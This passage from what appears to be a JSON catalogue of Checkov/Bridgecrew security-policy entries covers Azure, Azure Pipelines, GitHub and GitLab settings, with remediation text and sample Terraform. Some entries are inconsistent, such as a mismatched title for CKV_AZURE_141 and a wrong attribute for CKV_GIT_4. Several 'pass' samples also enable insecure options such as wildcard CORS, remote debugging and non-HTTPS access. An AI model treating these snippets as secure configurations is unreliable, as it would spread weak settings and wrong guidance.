        "description": "Azure Spring Cloud API Portal Public Access is enabled\nDescription\nDisabling the public network access property improves security by ensuring your Spring Cloud API Portals can only be accessed from a private endpoint. This configuration strictly disables access from any public address space outside of Azure IP range and denies all logins that match IP or virtual network-based firewall rules.\nFix - Runtime\nFix - Buildtime\n Resource: azurerm_spring_cloud_api_portal\n Attribute: public_network_access_enabled (default is \"false\")\nTextresource \"azurerm_spring_cloud_api_portal\" \"pass\" {\n  name                          = \"default\"\n  spring_cloud_service_id       = azurerm_spring_cloud_service.example.id\n  gateway_ids                   = [azurerm_spring_cloud_gateway.example.id]\n  https_only_enabled            = false\n  public_network_access_enabled = false\n  instance_count                = 1\n  sso {\n    client_id     = \"test\"\n    client_secret = \"secret\"\n    issuer_uri    = \"https://www.example.com/issueToken\"\n    scope         = [\"read\"]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_140": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-cosmosdb-has-local-authentication-disabled",
        "description": "Azure CosmosDB does not have Local Authentication disabled\nDescription\nDisabling local authentication for Azure CosmosDB can help improve the security of your database. Local authentication allows users to access the database using a local account and password, rather than an Azure Active Directory (Azure AD) account.\nBy disabling local authentication, you can ensure that all users must authenticate using an Azure AD account. This can help prevent unauthorized access to the database, and can also help protect against potential security threats such as data breaches or unauthorized access.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_cosmosdb_account\nArgument: local_authentication_disabled\n\nGoresource \"azurerm_cosmosdb_account\" \"pass\" {\n  name                          = \"pike-sql\"\n  location                      = \"uksouth\"\n  resource_group_name           = \"pike\"\n  offer_type                    = \"Standard\"\n  kind                          = \"GlobalDocumentDB\"\n  local_authentication_disabled = true\n  enable_free_tier              = true\n\n  consistency_policy {\n    consistency_level       = \"Session\"\n    max_interval_in_seconds = 5\n    max_staleness_prefix    = 100\n  }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_145": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-function-app-uses-the-latest-version-of-tls-encryption",
        "description": "Azure Function app does not use the latest version of TLS encryption\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your Azure Function apps.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_function_app\nArgument: site_config.min_tls_version\n\nGoresource \"azurerm_function_app\" \"pass2\" {\n  name                       = \"test-azure-functions\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  app_service_plan_id        = azurerm_app_service_plan.example.id\n  storage_account_name       = azurerm_storage_account.example.name\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  https_only                 = false\n\n  site_config {\n    dotnet_framework_version = \"v4.0\"\n    scm_type                 = \"LocalGit\"\n    min_tls_version          = 1.2\n    ftps_state               = \"AllAllowed\"\n    http2_enabled            = false\n    cors {\n      allowed_origins = [\"*\"]\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_134": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-cognitive-services-accounts-disable-public-network-access",
        "description": "Azure Cognitive Services accounts enable public network access\nDescription\nDisabling the public network access property improves security by ensuring your  Azure Cognitive Services can only be accessed from a private endpoint. This configuration strictly disables access from any public address space outside of Azure IP range and denies all logins that match IP or virtual network-based firewall rules.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_cognitive_account\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_cognitive_account\" \"examplea\" {\n  name                = \"example-account\"\n  location            = var.resource_group.location\n  resource_group_name = var.resource_group.name\n  kind                = \"Face\"\n  public_network_access_enabled = false\n  sku_name = \"S0\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_158": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-databricks-workspace-is-not-public",
        "description": "Azure Databricks workspace is public\nDescription\nDisabling the public network access property improves security by ensuring your  Azure Databricks workspace can only be accessed from a private endpoint. This configuration strictly disables access from any public address space outside of Azure IP range and denies all logins that match IP or virtual network-based firewall rules.\nFix - Runtime\nTBD\nFix - Buildtime \nTerraform\n\nResource: azurerm_databricks_workspace\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_databricks_workspace\" \"pass\" {\n  name                          = \"databricks-test\"\n  resource_group_name           = azurerm_resource_group.example.name\n  location                      = azurerm_resource_group.example.location\n  sku                           = \"standard\"\n  public_network_access_enabled = false\n\n  tags = {\n    Environment = \"Production\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_161": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-spring-cloud-api-portal-is-enabled-for-https",
        "description": "Azure Spring Cloud API Portal is not enabled for HTTPS\nDescription\nEnabling HTTPS for your Azure Spring Cloud API Portal can help improve the security of your API portal. HTTPS is a secure protocol that encrypts data in transit, and using it can help prevent attackers from intercepting and reading your data.\nFix - Runtime\nFix - Buildtime\n Resource: azurerm_spring_cloud_api_portal\n Attribute: https_only_enabled\nGoresource \"azurerm_spring_cloud_api_portal\" \"pass\" {\n  name                          = \"default\"\n  spring_cloud_service_id       = azurerm_spring_cloud_service.example.id\n  gateway_ids                   = [azurerm_spring_cloud_gateway.example.id]\n  https_only_enabled            = true\n  public_network_access_enabled = true\n  instance_count                = 1\n  sso {\n    client_id     = \"test\"\n    client_secret = \"secret\"\n    issuer_uri    = \"https://www.example.com/issueToken\"\n    scope         = [\"read\"]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_154": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-apps-service-slot-uses-the-latest-version-of-tls-encryption",
        "description": "Azure App's service slot does not use the latest version of TLS encryption\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your App service slots.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service_slot\nArgument: min_tls_version\n\nGoresource \"azurerm_app_service_slot\" \"pass2\" {\n  name                = \"ted\"\n  app_service_name    = azurerm_app_service.example.name\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  https_only = false #thedefault\n\n\n  site_config {\n    dotnet_framework_version = \"v4.0\"\n    min_tls_version          = \"1.2\" #the default is 1.2\n    remote_debugging_enabled = true  #default is false\n  }\n\n  app_settings = {\n    \"SOME_KEY\" = \"some-value\"\n  }\n\n  connection_string {\n    name  = \"Database\"\n    type  = \"SQLServer\"\n    value = \"Server=some-server.mydomain.com;Integrated Security=SSPI\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_18": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-storage-accounts-use-customer-managed-key-for-encryption",
        "description": "Azure storage account encryption CMKs are disabled\nDescription\nBy default all data at rest in Azure Storage account is encrypted using Microsoft Managed Keys. It is recommended to use Customer Managed Keys to encrypt data in Azure Storage accounts for better control on Storage account data.\nFix - Runtime\nIn Azure Console\n\nLog in to Azure Portal\nGo to Storage accounts dashboard and Click on reported storage account\nUnder the Settings menu, click on Encryption\nSelect Customer Managed Keys\n\n\nChoose 'Enter key URI' and Enter 'Key URI'\nOR\nChoose 'Select from Key Vault', Enter 'Key Vault' and 'Encryption Key'\n\n\nClick on 'Save'\"\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_storage_account_customer_managed_key , azurerm_client_config,  azurerm_key_vault, azurerm_key_vault_key\n\nGodata \"azurerm_client_config\" \"current\" {}\n\nresource \"azurerm_key_vault\" \"example\" {\n  name                = \"examplekv\"\n  location            = \"location\"\n  resource_group_name = \"group\"\n  tenant_id           = data.azurerm_client_config.current.tenant_id\n  sku_name            = \"standard\"\n\n  purge_protection_enabled = true\n}\n\nresource \"azurerm_key_vault_key\" \"example\" {\n  name         = \"tfex-key\"\n  key_vault_id = azurerm_key_vault.example.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n  key_opts     = [\"decrypt\", \"encrypt\", \"sign\", \"unwrapKey\", \"verify\", \"wrapKey\"]\n}\n\n\nresource \"azurerm_storage_account\" \"storage_account_good_1\" {\n  name                     = \"examplestor\"\n  resource_group_name      = \"group\"\n  location                 = \"location\"\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n\nresource \"azurerm_storage_account_customer_managed_key\" \"managed_key_good\" {\n  storage_account_id = azurerm_storage_account.storage_account_good_1.id\n  key_vault_id       = azurerm_key_vault.example.id\n  key_name           = azurerm_key_vault_key.example.name\n  key_version = \"1\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_139": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-acr-is-set-to-disable-public-networking",
        "description": "Azure Container registries Public access to All networks is enabled\nDescription\nDisabling the public network access by disabling automated anonymous pulling improves security by ensuring your Azure ACRs.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_container_registry\nArgument: anonymous_pull_enabled\n\nGoresource \"azurerm_container_registry\" \"ckv_unittest_pass_1\" {\n  name                   = \"containerRegistry1\"\n  resource_group_name    = azurerm_resource_group.rg.name\n  location               = azurerm_resource_group.rg.location\n  sku                    = \"Premium\"\n  anonymous_pull_enabled = false\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_155": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-app-service-slot-has-debugging-disabled",
        "description": "Azure App service slot does not have debugging disabled\nDescription\nDisabling debugging for your Azure App Service slot can help improve the security of your app. Debugging allows you to troubleshoot issues with your app by providing access to detailed information about how the app is functioning. However, it can also make it easier for attackers to gain access to sensitive information about your app, such as its code and configuration.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service_slot\nArgument: remote_debugging_enabled (default is false)\n\nGoresource \"azurerm_app_service_slot\" \"pass2\" {\n  name                = \"ted\"\n  app_service_name    = azurerm_app_service.example.name\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  https_only = false #thedefault\n\n\n  site_config {\n    dotnet_framework_version = \"v4.0\"\n    min_tls_version          = \"1.2\" #the default is 1.2\n    remote_debugging_enabled = false  #default is false\n  }\n\n  app_settings = {\n    \"SOME_KEY\" = \"some-value\"\n  }\n\n  connection_string {\n    name  = \"Database\"\n    type  = \"SQLServer\"\n    value = \"Server=some-server.mydomain.com;Integrated Security=SSPI\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_119": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-network-interfaces-dont-use-public-ips",
        "description": "Network interfaces use public IPs\nDescription\nA public IP address is an IPv4 address that is reachable from the Internet. You can use public addresses for communication between your instances and the Internet. \nWe recommend you control whether your network interfaces are required to use a public IP address.\nFix - Buildtime \nTerraform\n\nResource: azurerm_network_interface\nArgument: ip_configuration.public_ip_address_id (not exists)\n\nGoresource \"azurerm_network_interface\" \"example\" {\n                  name                = \"example-nic\"\n                  location            = azurerm_resource_group.example.location\n                  resource_group_name = azurerm_resource_group.example.name\n                \n                  ip_configuration {\n                    name                          = \"internal\"\n                    subnet_id                     = azurerm_subnet.example.id\n                    private_ip_address_allocation = \"Dynamic\"\n                  }       \n                    ip_configuration {\n                    name                          = \"internal2\"\n                    subnet_id                     = azurerm_subnet.example.id2\n                    private_ip_address_allocation = \"Dynamic\"\n                  }\n                  enable_ip_forwarding = false\n                }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_159": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-built-in-logging-for-azure-function-app-is-enabled",
        "description": "Azure Built-in logging for Azure function app is disabled\nDescription\nIt is recommended to have a proper logging process for Azure function app in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nRuntime - Buildtime \nFix - Buildtime \nTerraform\n\nResource:  azurerm_function_app_slot\nArgument: enable_builtin_logging\n\nGoresource \"azurerm_function_app_slot\" \"pass2\" {\n  name                       = \"test-azure-functions-slot\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  app_service_plan_id        = azurerm_app_service_plan.example.id\n  function_app_name          = azurerm_function_app.example.name\n  storage_account_name       = azurerm_storage_account.example.name\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  enable_builtin_logging     = true\n  site_config {\n    http2_enabled = false\n  }\n  auth_settings {\n    enabled = false\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_141": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-kubernetes-service-aks-local-admin-account-is-disabled",
        "description": "Azure subscriptions with custom roles are overly permissive\nDescription\nDisabling the local admin account for your Azure Kubernetes Service (AKS) cluster can help improve the security of your cluster. The local admin account has full access to all resources within the cluster, and can make any changes to the cluster and its contents.\nFix - Runtime\nCLI Command\nFix - Buildtime \nTerraform\n\nResource: azurerm_kubernetes_cluster\nArgument: local_account_disabled \n\nGoresource \"azurerm_kubernetes_cluster\" \"ckv_unittest_pass\" {\n  name                   = \"example-aks1\"\n  location               = azurerm_resource_group.example.location\n  resource_group_name    = azurerm_resource_group.example.name\n  local_account_disabled = true\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n\n  tags = {\n    Environment = \"Production\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_153": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-web-app-redirects-all-http-traffic-to-https-in-azure-app-service-slot",
        "description": "Azure web app does not redirect all HTTP traffic to HTTPS in Azure App Service Slot\nDescription\nRedirecting all HTTP traffic to HTTPS for your Azure web app in the App Service slot can help improve the security of your app. HTTPS is a secure protocol that encrypts data in transit, and using it can help prevent attackers from intercepting and reading your data.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service_slot\nArgument: https_only (true is default)\n\nGoresource \"azurerm_app_service_slot\" \"pass\" {\n  name                = random_id.server.hex\n  app_service_name    = azurerm_app_service.example.name\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  https_only = true #thedefault\n  min_tls_version=\"1.1\" #the default is 1.2\n  remote_debugging_enabled=true #default is false\n\n  site_config {\n    dotnet_framework_version = \"v4.0\"\n  }\n\n  app_settings = {\n    \"SOME_KEY\" = \"some-value\"\n  }\n\n  connection_string {\n    name  = \"Database\"\n    type  = \"SQLServer\"\n    value = \"Server=some-server.mydomain.com;Integrated Security=SSPI\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_137": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-acr-admin-account-is-disabled",
        "description": "Azure ACR admin account is enabled\nDescription\nDisabling the admin account for your Azure Container Registry (ACR) can help improve the security of your registry. The admin account has full access to all resources within the registry, and can make any changes to the registry and its contents.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_container_registry\nArgument: admin_enabled\n\nGoresource \"azurerm_container_registry\" \"ckv_unittest_pass\" {\n  name                = \"containerRegistry1\"\n  resource_group_name = azurerm_resource_group.rg.name\n  location            = azurerm_resource_group.rg.location\n  admin_enabled       = false\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_147": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-postgresql-uses-the-latest-version-of-tls-encryption",
        "description": "Azure PostgreSQL does not use the latest version of TLS encryption\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your PostgreSQL servers.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_server\nArgument: ssl_minimal_tls_version_enforced\n\nGoresource \"azurerm_postgresql_server\" \"pass\" {\n  name = \"fail\"\n\n  public_network_access_enabled    = true\n  ssl_enforcement_enabled          = true\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZUREPIPELINES_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-container-job-uses-a-non-latest-version-tag",
        "description": "Ensure the containers used in your pipelines have a defined version or a digest.\n-  container: ubuntu\n+  container: [email\u00a0protected]:817cfe4672284dcbfee885b1a66094fd907630d610cab329114d036716be49ba\n",
        "severity": "LOW"
    },
    "CKV_AZUREPIPELINES_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-container-job-uses-a-version-digest",
        "description": "Ensure the containers used in your pipelines have a defined version or a digest.\n-  container: ubuntu\n+  container: ubuntu:jammy-20221101\n",
        "severity": "LOW"
    },
    "CKV_AZUREPIPELINES_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-set-variable-is-not-marked-as-a-secret",
        "description": "You can set secret variables in a script with a logging command but this is not recommended since anyone who can access your pipeline will be able to also see the secret.\n   - bash: |\n       echo \"##vso[task.setvariable variable=normal_variable;]something\"\n-       echo \"##vso[task.setvariable variable=secret_variable;issecret=true]super-secret\"\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_157": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-postgresql-flexible-server-enables-geo-redundant-backups",
        "description": "Azure PostgreSQL Flexible Server does not enable geo-redundant backups\nDescription\nAzure PostgreSQL Flexible Server allows you to choose between locally redundant or geo-redundant backup storage in the General Purpose and Memory Optimized tiers. When the backups are stored in geo-redundant backup storage, they are not only stored within the region in which your server is hosted, but are also replicated to a paired data center. This provides better protection and ability to restore your server in a different region in the event of a disaster.\nFix - Runtime\nTBA\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_flexible_server\nArgument: geo_redundant_backup_enabled\n\nGoresource \"azurerm_postgresql_flexible_server\" \"pass\" {\n  name                   = \"example-psqlflexibleserver\"\n  resource_group_name    = \"azurerm_resource_group.example.name\"\n  location               = \"azurerm_resource_group.example.location\"\n  version                = \"12\"\n  delegated_subnet_id    = \"azurerm_subnet.example.id\"\n  private_dns_zone_id    = \"azurerm_private_dns_zone.example.id\"\n  administrator_login    = \"psqladmin\"\n  administrator_password = \"[email\u00a0protected]!\"\n  zone                   = \"1\"\n\n  storage_mb                   = 32768\n  geo_redundant_backup_enabled = true\n\n  sku_name   = \"GP_Standard_D4s_v3\"\n  depends_on = [\"azurerm_private_dns_zone_virtual_network_link.example\"]\n\n}\n",
        "severity": "LOW"
    },
    "CKV_GITHUB_17": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-requires-push-restrictions",
        "description": "GitHub branch protection does not require push restrictions\nDescription\nThis branch protection rule ensures that only specific users are able to merge code to a repository. This prevents code from bypassing checks and being merged without proper review.",
        "severity": "LOW"
    },
    "CKV_GITHUB_18": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-does-not-allow-deletions",
        "description": "GitHub branch protection rules allow branch deletions\nDescription\nProtected branches are by default not able to be deleted. This can be overridden from the branch protection rules, but should not be. A human mistake can delete an important branch.",
        "severity": "LOW"
    },
    "CKV_GITHUB_9": {
        "url": "https://docs.bridgecrew.io/docs/ensure-2-admins-are-set-for-each-repository",
        "description": "GitHub repository has less than 2 admins\nDescription\nHaving two or more admins allows for failover if an admin is busy and for checks between admins. Ensure you have at least two admins for every repository.",
        "severity": "LOW"
    },
    "CKV_GIT_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-repository-is-private",
        "description": "GitHub repository is not private\nDescription\nWhen you create a  Cloud repository, you specify whether it's private or public, but you can also change this setting at any time.\nIf your repository is public, anyone can access and fork it.\nIf your repository is private, you can specify who exactly can access your repository and whether they can fork it.\nFix - Buildtime\nGitHub\nWarning: This may break references to the repository\n\nOn GitHub.com, navigate to the repository.\nIn the menu bar under the repository name click on Settings\nIn the \"Danger Zone\" section, click on \"Change repository visibility\"\nChoose private\n",
        "severity": "LOW"
    },
    "CKV_GITHUB_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-require-2fa",
        "description": "GitHub organization security settings does not include 2FA capability\nDescription\nOrganization owners can require organization members, outside collaborators, and billing managers to enable two-factor authentication for their personal accounts, making it harder for malicious actors to access an organization's repositories and settings.\nFix - Buildtime\nGitHub\nEnforce two-factor authentication:\n\nIn the top right corner of GitHub.com, click your profile photo, then click Your organizations.\nNext to the organization, click Settings.\nIn the \"Security\" section of the sidebar, click  Authentication security.\nUnder \"Authentication\", select Require two-factor authentication for everyone in your organization, then click Save.\n",
        "severity": "HIGH"
    },
    "CKV_GITHUB_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-require-sso",
        "description": "GitHub organization security settings do not include SSO\nDescription\nOrganization owners and admins can enforce SAML SSO so that all organization members must authenticate via an identity provider (IdP). You can also enforce SAML SSO for your organization. When you enforce SAML SSO, all members of the organization must authenticate through your IdP to access the organization's resources. Enforcement removes any members and administrators who have not authenticated via your IdP from the organization. GitHub sends an email notification to each removed user.\nFix - Buildtime\nGitHub\nEnforce SAML SSO for your organization\n\nEnable and test SAML SSO for your organization, then authenticate with your IdP at least once. For more information, see \"Enabling and testing SAML single sign-on for your organization.\"\nPrepare to enforce SAML SSO for your organization. For more information, see \"Preparing to enforce SAML single sign-on in your organization.\"\nIn the top right corner of GitHub.com, click your profile photo, then click Your organizations.\nYour organizations in the profile menu\nNext to the organization, click Settings.\nIn the \"Security\" section of the sidebar, click  Authentication security.\nUnder \"SAML single sign-on\", select Require SAML SSO authentication for all members of the \nUnder \"Single sign-on recovery codes\", review your recovery codes. Store the recovery codes in a safe location like a password manager.\n",
        "severity": "HIGH"
    },
    "CKV_GITHUB_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-has-ip-allow-list-enabled",
        "description": "GitHub organization security settings does not have IP allow list enabled\nDescription\nIn GitHub Enterprise Cloud and GitHub AE, you can restrict access to organization assets by configuring an allow list for specific IP addresses. For example, it is possible to allow access from only the IP address of a trusted CIDR. The allow list for IP addresses will block access via the web, API, and Git from any IP addresses that are not on the allow list.\nFix - Buildtime\nGitHub\n\nGo to your organization page on GitHub\nClick on Settings and then Security\nIn the IP allowlist section, click on Enable IP allowlist\nAdd the IP addresses and ranges that you want to allow access to your organization's resources\n",
        "severity": "LOW"
    },
    "CKV_GITHUB_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-signed-commits",
        "description": "GitHub branch protection rules do not include signed commits\nDescription\nIn GitHub, Branch Protection Rules define whether collaborators can delete or force push to the branch and set requirements for any pushes to the branch, such as passing status checks or a linear commit history.\nWhen you enable required commit signing on a branch, contributors and bots can only push commits that have been signed and verified to the branch. If a collaborator pushes an unsigned commit to a branch that requires commit signatures, the collaborator will need to rebase the commit to include a verified signature, then force push the rewritten commit to the branch.\nFix - Buildtime\nTerraform\n\nResource: github_branch_protection, github_branch_protection_v3\nAttribute: require_signed_commits\n\nHCLresource \"github_branch_protection_v3\" \"example\" {\n...\n+  require_signed_commits = true\n}\n",
        "severity": "LOW"
    },
    "CKV_GITHUB_5": {
        "url": "https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals",
        "description": "GitHub pull requests have less than approvals\nDescription\nIn GitHub, repository administrators can require that all pull requests receive a specific number of approving reviews before someone merges the pull request into a protected branch. It is also possible to require approving reviews from people with write permissions in the repository or from a designated code owner.\nIf a collaborator attempts to merge a pull request with pending or rejected reviews into the protected branch, the collaborator will receive an error message.\nFix - Buildtime\nTerraform\n\nResource: github_branch_protection, github_branch_protection_v3\nAttribute: required_approving_review_count\n\nHCLresource \"github_branch_protection_v3\" \"example\" {\n...  \n  required_pull_request_reviews {\n+    required_approving_review_count = 2\n...\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GITLAB_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-all-gitlab-groups-require-two-factor-authentication",
        "description": "Gitlab organization has groups with no two factor authentication configured\nDescription\nIn GitLab, Two-factor authentication (2FA) provides an additional level of security to user accounts. When enabled, users are prompted for a code generated by an application in addition to supplying their username and password to sign in.\nFix - Buildtime\nGitLab\nEnable 2FA for all users:\n\nOn the top bar, select Menu > Admin.\nOn the left sidebar, select Settings > General (/admin/application_settings/general).\nExpand the Sign-in restrictions section, where you can configure both.\n\nEnforce 2FA only for certain groups:\n\nGo to the group\u2019s Settings > General page.\nExpand the Permissions and group features section.\nSelect the Require all users in this group to set up two-factor authentication option.\n",
        "severity": "HIGH"
    },
    "CKV_GITLAB_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gitlab-branch-protection-rules-does-not-allow-force-pushes",
        "description": "Gitlab branch protection rules force push is enabled\nDescription\nIn GitLab, permissions are fundamentally defined around the idea of having read or write permission to the repository and branches. To impose further restrictions on certain branches, they can be protected.\nWhen you perform more complex operations, for example, squash commits, reset or rebase your branch, you must force an update to the remote branch. These operations imply rewriting the commit history of the branch. Forcing an update is not recommended when you\u2019re working on shared branches.\nYou can enable force push on a protected branch, but this is ill-advised.\nFix - Buildtime\nTerraform\n\nResource: gitlab_branch_protection\nAttribute: allow_force_push\n\nGoresource \"gitlab_branch_protection\" \"BranchProtect\" {\n...\n-  allow_force_push             = true\n+  allow_force_push             = false\n...\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GIT_5": {
        "url": "https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals",
        "description": "GitHub pull requests have less than approvals\nDescription\nIn GitHub, repository administrators can require that all pull requests receive a specific number of approving reviews before someone merges the pull request into a protected branch. It is also possible to require approving reviews from people with write permissions in the repository or from a designated code owner.\nIf a collaborator attempts to merge a pull request with pending or rejected reviews into the protected branch, the collaborator will receive an error message.\nFix - Buildtime\nTerraform\n\nResource: github_branch_protection, github_branch_protection_v3\nAttribute: required_approving_review_count\n\nHCLresource \"github_branch_protection_v3\" \"example\" {\n...  \n  required_pull_request_reviews {\n+    required_approving_review_count = 2\n...\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GIT_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-signed-commits",
        "description": "GitHub branch protection rules do not include signed commits\nDescription\nIn GitHub, Branch Protection Rules define whether collaborators can delete or force push to the branch and set requirements for any pushes to the branch, such as passing status checks or a linear commit history.\nWhen you enable required commit signing on a branch, contributors and bots can only push commits that have been signed and verified to the branch. If a collaborator pushes an unsigned commit to a branch that requires commit signatures, the collaborator will need to rebase the commit to include a verified signature, then force push the rewritten commit to the branch.\nFix - Buildtime\nTerraform\n\nResource: github_branch_protection, github_branch_protection_v3\nAttribute: require_signed_commits\n\nHCLresource \"github_branch_protection_v3\" \"example\" {\n...\n+  require_signed_commits = true\n}\n",
        "severity": "LOW"
    },
    "CKV_GITHUB_16": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-requires-conversation-resolution",
        "description": "GitHub branch protection does not require conversation resolution\nDescription\nThis branch protection rule requires that all comments on a pull request are addressed or acknowledged, ensuring that all reviewers' concerns are reviewed.",
        "severity": "LOW"
    },
    "CKV_GIT_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-organization-and-repository-webhooks-are-using-https",
        "description": "GitHub repository webhooks do not use HTTPs\nDescription\nWebhooks can be configured to use endpoints of your choosing, including whether TLS is enabled or not. Ensure you are using a webhook endpoint with encryption by using a standard HTTPS URL.\nFix - Buildtime\nTerraform\n\nResource: github_repository_webhook\nAttribute: insecure_ssl\n\nGoresource \"github_repository_webhook\" \"foo\" {\n...\n  configuration {\n-    url          = \"http://google.com/\"\n+    url          = \"https://google.com/\"\n-    insecure_ssl = false\n+    insecure_ssl = false\n  }\n\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GIT_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-repository-has-vulnerability-alerts-enabled",
        "description": "GitHub Repository doesn't have vulnerability alerts enabled\nDescription\nGitHub has the ability to scan dependencies for vulnerabilities. To enable this, you must also enable it at the owner level as well. By default, this is enabled for public repos but not for private repos.\nFix - Buildtime\nTerraform\n\nResource: github_repository\nAttribute: vulnerability_alerts\n\nHCLresource \"github_repository\" \"example\" {\n+  vulnerability_alerts = true\n}\n",
        "severity": "LOW"
    },
    "CKV_GIT_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-actions-secrets-are-encrypted",
        "description": "GitHub Actions Environment Secrets are not encrypted\nDescription\nIn the GitHub Terraform provider, there is an optional field to include a plaintext string of the secret. If this is checked into code, it will expose the secret.\nFix - Buildtime\nTerraform\n\nResource: github_actions_environment_secret, github_actions_organization_secret, github_actions_secret\nAttribute: vulnerability_alerts\n\nHCLresource \"github_actions_environment_secret\" \"test_secret\" {\n...\n-  plaintext_value  = \"example%value\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_GITHUB_7": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-organization-and-repository-webhooks-are-using-https",
